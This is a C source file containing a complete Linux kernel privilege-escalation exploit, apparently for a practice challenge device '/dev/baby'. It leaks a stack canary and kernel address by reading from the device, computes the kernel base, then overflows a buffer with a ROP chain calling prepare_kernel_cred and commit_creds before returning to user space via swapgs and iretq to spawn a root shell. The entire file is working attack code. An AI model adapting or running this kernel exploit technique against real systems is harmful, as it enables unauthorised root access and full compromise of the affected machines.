#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>

typedef uint64_t u64;

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  printf("win!!\n");
  execve("/bin/sh", argv, envp);
}

u64 user_ss, user_sp, user_cs, user_rflags;

void save_state() {
  __asm__ (
    ".intel_syntax noprefix;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "mov user_cs, cs;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );

  printf("ss: %ld\n", user_ss);
  printf("sp: %ld\n", user_sp);
  printf("cs: %ld\n", user_cs);
  printf("rflags: %ld\n", user_rflags);
  
  printf("[+] state saved\n");
}

int main(void) {
  save_state();

  int fd = open("/dev/baby", O_RDWR);
  if (fd < 0) {
    perror("read");
    goto fail;
  }

  char buf[512];

  memset(buf, 0, sizeof(buf));
  size_t n = read(fd, buf, 500);
  if (n < 0) {
    perror("read");
    goto fail;
  }

  printf("read: %zd\n", n);

  unsigned long *ptr = (unsigned long *)buf;

  // debug print leaks
  // for (size_t i = 0; i < n / 8; i++) {
  //   printf("[%zu][%zu]: 0x%016lx\n", i*8, i, ptr[i]);
  // }

  printf("\n");

  unsigned long canary = ptr[400 / 8];
  unsigned long leak   = ptr[408 / 8];
  unsigned long kbase  = leak - 0x1ca727;
  
  printf("[*] canary: 0x%016lx\n", canary);
  printf("[+] leak: 0x%16lx\n", leak);
  printf("[+] kernel base: 0x%16lx\n", kbase);

  char payload[600];
  
  memset(payload, 0, 400);
  
  u64 poprdi = kbase + 0x279a;
  u64 prepare_cred = kbase + 0x861d0;
  u64 commit_creds = kbase + 0x85fa0;
  u64 poprcx = kbase + 0x50d76;
  u64 movrdirax = kbase + 0x1bbfb;
  u64 swapgs = kbase + 0xc00f0a;
  u64 iretq = kbase + 0x3dc;

  /*
    safe se rcx = 0
    0xffffffff8101bbfb : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret

    iretq pop order:
      - RIP
      - CS
      - RFALGS
      - SP
      - SS
  */

  int i = 0;
  u64 *p = (unsigned long*)(payload + 400);
  p[i++] = canary;
  p[i++] = poprdi;
  p[i++] = 0;
  p[i++] = prepare_cred;
  p[i++] = poprcx;
  p[i++] = 0x00;
  p[i++] = movrdirax;
  p[i++] = commit_creds;
  p[i++] = swapgs;
  p[i++] = user_rflags;
  p[i++] = iretq;
  p[i++] = (u64)&win;
  p[i++] = user_cs;
  p[i++] = user_rflags;
  p[i++] = user_sp;
  p[i++] = user_ss;

  n = write(fd, payload, 400+i*8);  
  if (n < 0) {
    perror("write");
    goto fail;
  }
  
  return 0;

  fail:
    return 1;
}
